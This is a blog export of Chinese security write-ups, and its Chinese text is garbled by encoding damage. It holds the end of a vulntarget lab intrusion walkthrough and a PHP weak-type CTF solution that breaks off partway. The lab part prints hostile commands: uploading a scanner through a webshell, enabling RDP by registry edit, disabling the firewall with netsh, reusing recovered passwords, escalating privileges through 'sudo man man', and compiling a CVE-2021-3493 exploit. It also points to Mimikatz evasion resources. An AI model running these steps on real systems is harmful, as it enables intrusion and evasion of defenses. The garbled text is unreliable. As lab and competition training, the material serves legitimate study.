alt="image-20221130201732733"></p><p>æ²¡å…³ç³»ï¼Œæœ‰ä¸ªå¸ˆå‚…äºŒå¼€äº†fscançš„ï¼Œ<code>https://github.com/h0nayuzu/Fscan_BaihuaSec/releases</code>æˆ‘ä»¬å»è¯•ä¸€ä¸‹ï¼Œ</p><p>è¿™ä¸ªæ–‡ä»¶æœ‰ç‚¹å¤§ï¼Œ20å¤šmï¼Œèšå‰‘è¶…æ—¶çš„è¯å°±ä¸Šä¼ å¤±è´¥äº†ï¼Œæˆ‘ä»¬æ”¹ä¸€ä¸‹è¶…æ—¶æ—¶é—´ï¼Œæ”¹å¤§ç‚¹</p><p><img src="/images/vulntarget-e/image-20221130202142743.png" alt="image-20221130202142743"></p><p>ç¬”è€…åœ¨è¿™é‡Œä¸Šä¼ æˆåŠŸäº†ï¼Œä½†æ˜¯ä¸èƒ½ç”¨ï¼Œç¬”è€…åˆä¼ äº†ä¸€éï¼Œè¿™æ ·çš„è¯ä¸‰æ¬¡äº†ï¼Œå…¨éƒ¨å åŠ äº†ä¸€èµ·å¹¶æ²¡æœ‰è¦†ç›–ï¼Œæˆ‘ä»¬ä»æ–°æ”¹ä¸ªåå­—ä¼ ï¼Œæˆ–è€…åˆ äº†åˆä¼ äº†å‡ éï¼Œè¿˜æ˜¯æ²¡æˆåŠŸï¼Œå¯èƒ½æ˜¯ä»£ç†çš„é—®é¢˜ï¼Œæ–‡ä»¶æœ‰ç‚¹å¤§ï¼Œä½œè€…è¯´äº†ï¼Œè¿™é‡Œæ‰“åŒ…å‡ºæ¥çš„fscanå°±æ˜¯è¿™ä¹ˆå¤§æ²¡æœ‰å‹ç¼©ï¼Œå¯ä»¥è‡ªå·±å‹ç¼©ï¼Œupxå‹ä¸€ä¸‹ï¼Œæˆ–è€…ä¸Šé¢é‚£ä¸ªå·¥å…·ï¼Œæˆ‘ä»¬è¯•ä¸‹godzillaå¤§æ–‡ä»¶ä¸Šä¼ </p><p><img src="/images/vulntarget-e/image-20221130202622434.png" alt="image-20221130202622434"></p><p><img src="/images/vulntarget-e/image-20221130202834288.png" alt="image-20221130202834288"></p><p>è¿™é‡Œå°tipï¼Œå“¥æ–¯æ‹‰æ˜¯å¯ä»¥è¿æ¥ä¸€å¥è¯çš„ã€‚æ‰€ä»¥ç›´æ¥è¿å°±è¡Œ</p><p><img src="/images/vulntarget-e/image-20221130204635575.png" alt="image-20221130204635575"></p><p>è¿™é‡Œå“¥æ–¯æ‹‰ä¼ ä¸Šæ¥æ²¡æœ‰é—®é¢˜ï¼Œå›¾æ²¡æˆª</p><p><img src="/images/vulntarget-e/image-20221130205528351.png" alt="image-20221130205528351"></p><p>.\fscan_win_amd64.exe -h 10.0.10.0/24 -o r.txt</p><p><img src="/images/vulntarget-e/image-20221130205706916.png" alt="image-20221130205706916"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä¸ª20çš„æ®µ 110çš„ipåªå¼€äº†22ç«¯å£ï¼Œæ˜¾ç„¶æ˜¯å°linuxäº†ï¼Œä¼°è®¡åˆæ˜¯å¼±å£ä»¤ï¼Œæˆ–è€…æ¼æ´äº†ã€‚</p><p>æ­£å¸¸æ€è·¯æ˜¯ä¸Šewï¼Œç„¶åæ‰“åä¸€ä¸ªç½‘ç«¯ï¼Œä½†æ˜¯è¿™é‡Œä¸æ˜¯è¿™æ ·çš„ï¼Œæˆ‘ä»¬è¦è·å–è¿œç¨‹æ¡Œé¢ï¼Œå¼€ä¸‹3389å…¶å®è¿™æ ·åšåœ¨å®æˆ˜ä¸­æ˜¯éå¸¸å±é™©çš„ï¼Œå®¹æ˜“è¢«å‘ç°ã€‚ä¸è¿‡è¿™é‡Œè¿˜æ˜¯å…ˆè¦è¿™æ ·æ“ä½œã€‚</p><p>æˆ‘ä»¬å…ˆcmdæŠŠ3389å¼€äº†<code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</code></p><p><img src="/images/vulntarget-e/image-20221130210751420.png" alt="image-20221130210751420"></p><p>æ‰“å¼€ä¹‹åç›´æ¥ç™»å½•å°±è¡Œäº†ï¼Œadministrator/Admin#123</p><p><img src="/images/vulntarget-e/image-20221130210947108.png" alt="image-20221130210947108"></p><p>å“¦å¯¹äº†ï¼Œå…¶å®è¿˜æ˜¯è¿ä¸ä¸Šï¼Œé˜²ç«å¢™å¼€ç€ï¼Œæˆ‘ä»¬å†æŠŠé˜²ç«å¢™å…³äº†</p><p><code>netsh advfirewall set allprofiles state off</code>\</p><p><img src="/images/vulntarget-e/image-20221130211126227.png" alt="image-20221130211126227"></p><p>å°±è¿ä¸Šæ¥äº†</p><p><img src="/images/vulntarget-e/image-20221130211216240.png" alt="image-20221130211216240"></p><p>ä¸‹é¢æœ‰ä¸€ä¸ªmobaï¼Œæˆ‘ä»¬æ‰“å¼€æ˜¯è¦å¯†ç çš„ï¼Œç„¶åè¾“ä¸€ä¸‹åˆšåˆšadministratorçš„å¯†ç ï¼Œä¸Šé¢flagè¯´äº†,å¯†ç ä¼šç”¨åˆ°å…¶ä»–åœ°æ–¹ï¼Œ</p><p><img src="/images/vulntarget-e/image-20221130211247112.png" alt="image-20221130211247112"></p><h3 id="mobaåˆ©ç”¨ã€cve-2021-3493"><a href="#mobaåˆ©ç”¨ã€cve-2021-3493" class="headerlink" title="mobaåˆ©ç”¨ã€cve_2021_3493"></a>mobaåˆ©ç”¨ã€cve_2021_3493</h3><h4 id="éé¢„æœŸ"><a href="#éé¢„æœŸ" class="headerlink" title="éé¢„æœŸ"></a>éé¢„æœŸ</h4><p>ç›´æ¥å°±å¯ä»¥è¿ä¸Šæ¥ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ªvulntargetçš„æ™®é€šç”¨æˆ·ï¼Œé‚£è‚¯å®šæ˜¯æƒ³åŠæ³•ææƒï¼Œä¸Šlseç­‰ç­‰ï¼Œè¿™è¾¹ç¬”è€…æä¾›ä¸¤ä¸ªæ–¹æ³•ï¼Œä¸€ä¸ªæ˜¯é¢„æœŸè§£å’Œä¸€ä¸ªéé¢„æœŸè§£ï¼Œéé¢„æœŸè§£æ˜¯ä¸€ä¸ªç®€å•çš„ææƒæ–¹æ³•ï¼Œæœ‰å¾ˆå¤šæœºå™¨å¦‚æœä½ æœ‰äº†ä¸€ä¸ªæ™®é€šçš„å¯ä»¥ç™»å½•çš„è´¦æˆ·å¯ä»¥è¯•è¯•è¿™ä¸ªï¼Œå±¡è¯•ä¸çˆ½ã€‚sudoæ¼æ´</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo man man</span><br><span class="line">è¾“å…¥è¿™ä¸ªç”¨æˆ·çš„å¯†ç </span><br><span class="line">ï¼</span><br><span class="line">å‡ºå»å°±æ˜¯rootäº†</span><br></pre></td></tr></table></figure><p><img src="/images/vulntarget-e/image-20221130211440233.png" alt="image-20221130211440233"></p><p>ä½†æ˜¯è¿™é‡Œæˆ‘ä»¬å¹¶ä¸çŸ¥é“vulntargetçš„å¯†ç ï¼Œå› ä¸ºä¸Šé¢è¿›æ¥çš„æ—¶å€™æ˜¯è¾“å…¥çš„mobaçš„å®‰å…¨å¯†ç ï¼Œå¹¶ä¸æ˜¯sshçš„å¯†ç ï¼Œä½†æ˜¯è¿™é‡Œæ˜¯å¯ä»¥çœ‹åˆ°çš„ï¼Œä¾æ¬¡ç‚¹å‡»settings-&gt;configuration-&gt;mobapasswords-&gt;show passs-&gt;è¿™ä¸ªpasså°±æ˜¯mobaçš„å®‰å…¨å¯†ç ï¼Œ</p><p><img src="/images/vulntarget-e/image-20221130212059351.png" alt="image-20221130212059351"></p><p><img src="/images/vulntarget-e/image-20221130212240621.png" alt="image-20221130212240621"></p><p>å³é¢å°±ä¼šæ˜¾ç¤ºå¯†ç äº†ï¼Œvuln@qweå¥½æ¥ä¸‹æ¥sudoææƒ</p><p>sudo man man</p><p>vuln@qwe</p><p>!</p><p>å›è½¦</p><p><img src="/images/vulntarget-e/image-20221130212542320.png" alt="image-20221130212542320"></p><p><img src="/images/vulntarget-e/image-20221130212417710.png" alt="image-20221130212417710"></p><p><img src="/images/vulntarget-e/image-20221130212706685.png" alt="image-20221130212706685"></p><p>è‡³æ­¤å°±æ‹¿ä¸‹äº†æœ€åä¸€å°é¶æœºï¼Œrootä¸‹æœ‰ä¸ªflagï¼Œ<code>find /* -name &quot;*flag*&quot;</code></p><p><img src="/images/vulntarget-e/image-20221130213029531.png" alt="image-20221130213029531"></p><p>ç…ä¸€çœ¼ï¼Œ</p><p>root@ubuntu:~# cat /root/flag<br>Congratulations on winning the final flag</p><p>vulntarget{cve_2021_3493_local_privilege_promotion_overlayfs}</p><p>å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ª2021_3493,æ˜¯é‚£ä¸ªææƒæ¼æ´ã€‚</p><p>ç¬”è€…è¿™é‡Œè·‘äº†ä¸€ä¸‹rootå¯†ç ï¼Œæ²¡å‡ºï¼Œemmmmm</p><p><img src="/images/vulntarget-e/image-20221130220156785.png" alt="image-20221130220156785"></p><h4 id="ä»¥ä¸Šå°±æ˜¯éé¢„æœŸè§£ï¼Œä¸‹é¢æ˜¯é¢„æœŸè§£"><a href="#ä»¥ä¸Šå°±æ˜¯éé¢„æœŸè§£ï¼Œä¸‹é¢æ˜¯é¢„æœŸè§£" class="headerlink" title="ä»¥ä¸Šå°±æ˜¯éé¢„æœŸè§£ï¼Œä¸‹é¢æ˜¯é¢„æœŸè§£"></a>ä»¥ä¸Šå°±æ˜¯éé¢„æœŸè§£ï¼Œä¸‹é¢æ˜¯é¢„æœŸè§£</h4><p><code>git clone https://github.com/briskets/CVE-2021-3493</code></p><p>cdè¿›å»</p><p>æ‰¾ä¸€å°ubuntuå»å…‹éš†ä¸€ä¸‹è¿™ä¸ªexpé¡¹ç›®ï¼Œè¿™é‡Œæ³¨æ„è‹¥æ˜¯åœ¨kaliä¸Šç¼–è¯‘ï¼Œæ‹¿å‡ºæ¥å»ç›®æ ‡æœºä¸Šæ‰§è¡Œä¼šæŠ¥é”™ï¼Œæ‰¾ä¸åˆ°soæ–‡ä»¶ã€‚</p><p><code>gcc exploit.c -o exploit</code> </p><p>ç¼–è¯‘ä¸€ä¸‹ï¼Œæ‹–å‡ºæ¥åˆ°ç›®æ ‡æœºä¸Šï¼Œè¿™é‡Œæ‹–åˆ°winä¸Šä¼šæŠ¥æ¯’ï¼Œæˆ‘è¿™é‡Œç›´æ¥æŠŠdfå…³æ‰å§ï¼Œå¦‚æœä¸æƒ³å…³äº†ï¼Œå°±æ‰“ä¸ªtaråŒ…ï¼Œåˆ°ç›®æ ‡æœºä¸Šåœ¨è§£å‹ï¼Œrdpä¸èƒ½æ‹–çš„è¯ï¼Œå¯ä»¥å¤åˆ¶ç²˜è´´ï¼Œ</p><p><img src="/images/vulntarget-e/image-20221130215219417.png" alt="image-20221130215219417"></p><p>è¿™æ ·ä¹Ÿæ‹¿ä¸‹äº†è¿™å°æœºå™¨ã€‚è‡³æ­¤æ•´ä¸ªé¶åœºå°±æ‰“å®Œäº†ã€‚</p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p>å‚è€ƒæ–‡ç« </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/crow821/vulntarget <span class="comment">#é¶åœºå®˜æ–¹åœ°å€</span></span><br><span class="line">https://mp.weixin.qq.com/s/cisoqDnsHqyzCFdx-eG5TQ <span class="comment">#ä½œè€…çš„æ­å»ºä¸æ‰“é¶è®°å½•</span></span><br><span class="line">https://www.freebuf.com/articles/web/333566.html <span class="comment">#vulntargetæ¼æ´é¶åœºç³»åˆ—ï¼ˆä¸‰ï¼‰ï¼švulntarget-c</span></span><br><span class="line">https://cloud.tencent.com/developer/article/1171183 <span class="comment">#ä¹ç§å§¿åŠ¿è¿è¡ŒMimikatz</span></span><br><span class="line">https://www.freebuf.com/news/234365.html <span class="comment">#Mimikatzçš„18ç§å…æ€å§¿åŠ¿åŠé˜²å¾¡ç­–ç•¥</span></span><br><span class="line">https://www.freebuf.com/vuls/280508.html <span class="comment">#Laravel RCEï¼ˆCVE-2021-3129ï¼‰æ¼æ´å¤ç°</span></span><br></pre></td></tr></table></figure><p>ç”¨åˆ°å·¥å…·</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">VMProtect Ultimate 3.4.0åŠ å£³è½¯ä»¶</span><br><span class="line">https://pan.baidu.com/s/1VXaZgZ1YlVQW9P3B_ciChg æå–ç : emnq</span><br><span class="line">æ­¤ç™¾åº¦ç½‘ç›˜åŸé“¾åœ¨`https://www.freebuf.com/news/234365.html`ä¸­</span><br><span class="line"></span><br><span class="line">äºŒå¼€fscan</span><br><span class="line">https://github.com/h0nayuzu/Fscan_BaihuaSec/releases</span><br></pre></td></tr></table></figure><h3 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h3><blockquote><p>å› ä¸ºä¸ªäººèƒ½åŠ›æœ‰é™ï¼Œæ–‡ç« ä¸­è‹¥æœ‰é”™è¯¯ï¼Œæ•¬è¯·æ–§æ­£<br>ä¸€ç›´åœ¨è·¯ä¸Š</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> å…æ€ </tag>
            
            <tag> é¶åœº </tag>
            
            <tag> vulntarget-c </tag>
            
            <tag> laravel </tag>
            
            <tag> OVAS-PHPç›¸å…³æ¼æ´ </tag>
            
            <tag> éš§é“ä»£ç† </tag>
            
            <tag> ææƒ </tag>
            
            <tag> CVE-2021-3129 </tag>
            
            <tag> CVE-2021-3493 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬äºŒå±ŠåŒ—äº¬å¤§å­¦ä¿¡æ¯å®‰å…¨ç»¼åˆèƒ½åŠ›ç«èµ›éƒ¨åˆ†wp</title>
      <link href="/2022/11/24/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%8C%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BB%BC%E5%90%88%E8%83%BD%E5%8A%9B%E7%AB%9E%E8%B5%9B%E9%83%A8%E5%88%86wp/"/>
      <url>/2022/11/24/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%8C%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BB%BC%E5%90%88%E8%83%BD%E5%8A%9B%E7%AB%9E%E8%B5%9B%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%8C%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BB%BC%E5%90%88%E8%83%BD%E5%8A%9B%E7%AB%9E%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20221124111931793.png" alt="image-20221124111931793"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2022å¹´å¤©æ´¥å¸‚å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç½‘ç»œæ”»é˜²å¤§èµ›éƒ¨åˆ†wp</title>
      <link href="/2022/09/29/CTFS/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/"/>
      <url>/2022/09/29/CTFS/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<p>æœ¬æ¥æƒ³ä¸è®°å½•äº† ï¼Œä¹Ÿéƒ½æ˜¯ç½‘ä¸Šèƒ½æœåˆ°çš„é¢˜ï¼Œæœ€åæƒ³äº†ä¸€ä¸‹è¿˜æ˜¯è®°å½•ä¸€ä¸‹å§</p><h2 id="ç†è®ºé¢˜"><a href="#ç†è®ºé¢˜" class="headerlink" title="ç†è®ºé¢˜"></a>ç†è®ºé¢˜</h2><p>æ²¡å•¥æ„æ€</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="æœ€å¥½çš„è¯­è¨€"><a href="#æœ€å¥½çš„è¯­è¨€" class="headerlink" title="æœ€å¥½çš„è¯­è¨€"></a>æœ€å¥½çš„è¯­è¨€</h3><p>300pt (å·²åšå‡º) è€ƒç‚¹ is_number array_search() å¼±ç±»å‹æ¯”è¾ƒ<br>èµ›é¢˜åœ°å€<code>http://ctftime1.usaas.net/web/good/index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="number">0</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="number">0</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="number">0</span>;</span><br><span class="line"><span class="variable">$d</span>=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x1&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">        <span class="variable">$x1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x1&#x27;</span>];</span><br><span class="line">        <span class="variable">$x1</span>==<span class="string">&quot;1&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$x1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="variable">$a</span>=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$x2</span>=(<span class="keyword">array</span>)json_decode(@<span class="variable">$_GET</span>[<span class="string">&#x27;x2&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(is_array(<span class="variable">$x2</span>))&#123;</span><br><span class="line">    is_numeric(@<span class="variable">$x2</span>[<span class="string">&quot;x21&quot;</span>])?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>(@<span class="variable">$x2</span>[<span class="string">&quot;x21&quot;</span>])&#123;</span><br><span class="line">        (<span class="variable">$x2</span>[<span class="string">&quot;x21&quot;</span>]&gt;<span class="number">2017</span>)?<span class="variable">$b</span>=<span class="number">1</span>:<span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(is_array(@<span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(count(<span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>])!==<span class="number">2</span> <span class="keyword">OR</span> !is_array(<span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>);</span><br><span class="line">        <span class="variable">$p</span> = array_search(<span class="string">&quot;XIPU&quot;</span>, <span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>]);</span><br><span class="line">        <span class="variable">$p</span>===<span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">            <span class="variable">$val</span>===<span class="string">&quot;XIPU&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$c</span>=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$x3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x3&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$x3</span> != <span class="string">&#x27;15562&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (strstr(<span class="variable">$x3</span>, <span class="string">&#x27;XIPU&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (substr(md5(<span class="variable">$x3</span>),<span class="number">8</span>,<span class="number">16</span>) == substr(md5(<span class="string">&#x27;15562&#x27;</span>),<span class="number">8</span>,<span class="number">16</span>)) &#123;</span><br><span class="line">            <span class="variable">$d</span>=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> &amp;&amp; <span class="variable">$b</span> &amp;&amp; <span class="variable">$c</span> &amp;&amp; <span class="variable">$d</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å…ˆæ¥çœ‹æœ€åä¸€æ®µ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> &amp;&amp; <span class="variable">$b</span> &amp;&amp; <span class="variable">$c</span> &amp;&amp; <span class="variable">$d</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line">è¿™é‡Œå­˜åœ¨åˆ¤æ–­ abcdéƒ½è¦ä¸º<span class="number">1</span>ä¹Ÿå°±æ˜¯<span class="literal">true</span>  æ‰å¯ä»¥<span class="keyword">echo</span> flag</span><br><span class="line">```php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="number">0</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="number">0</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="number">0</span>;</span><br><span class="line"><span class="variable">$d</span>=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x1&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">        <span class="variable">$x1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x1&#x27;</span>];</span><br><span class="line">        <span class="variable">$x1</span>==<span class="string">&quot;1&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$x1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="variable">$a</span>=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>getä¼ ä¸ªx1 å¹¶ä¸”  $x1==â€1â€?die(â€œha?â€):NULL;  ä¸‰ç›®è¿ç®—ç¬¦ï¼Œè¿™å¥æ„æ€æ˜¯å¦ä¸º1  ä¸º1åˆ™die<br>é‚£æˆ‘ä»¬ä¸ºx1 ä¸º0  switch ä¼šå…ˆç»è¿‡0  æ²¡æœ‰break  æ¥ç€ä¼šcase1 è¿™æ ·  a=1äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$x2</span>=(<span class="keyword">array</span>)json_decode(@<span class="variable">$_GET</span>[<span class="string">&#x27;x2&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(is_array(<span class="variable">$x2</span>))&#123;</span><br><span class="line">    is_numeric(@<span class="variable">$x2</span>[<span class="string">&quot;x21&quot;</span>])?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>(@<span class="variable">$x2</span>[<span class="string">&quot;x21&quot;</span>])&#123;</span><br><span class="line">        (<span class="variable">$x2</span>[<span class="string">&quot;x21&quot;</span>]&gt;<span class="number">2017</span>)?<span class="variable">$b</span>=<span class="number">1</span>:<span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(is_array(@<span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(count(<span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>])!==<span class="number">2</span> <span class="keyword">OR</span> !is_array(<span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>);</span><br><span class="line">        <span class="variable">$p</span> = array_search(<span class="string">&quot;XIPU&quot;</span>, <span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>]);</span><br><span class="line">        <span class="variable">$p</span>===<span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">            <span class="variable">$val</span>===<span class="string">&quot;XIPU&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$c</span>=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆä¼ ä¸€ä¸ªjsonæ•°æ®  jsonæ ‡å‡†æ ¼å¼ä¸º<code>&#123;&quot;a&quot;:â€sasdâ€œ,&quot;b&quot;:2,&quot;c&quot;:3,&quot;d&quot;:4,&quot;e&quot;:5&#125;</code><br> is_numeric(@$x2[â€œx21â€])?die(â€œha?â€):NULL;  è¿™é‡Œå¿…é¡»ä¸èƒ½æ˜¯çº¯æ•°å­—ä¸”è¦å¤§äº2017ã€æ€ä¹ˆç»•å‘¢<br> 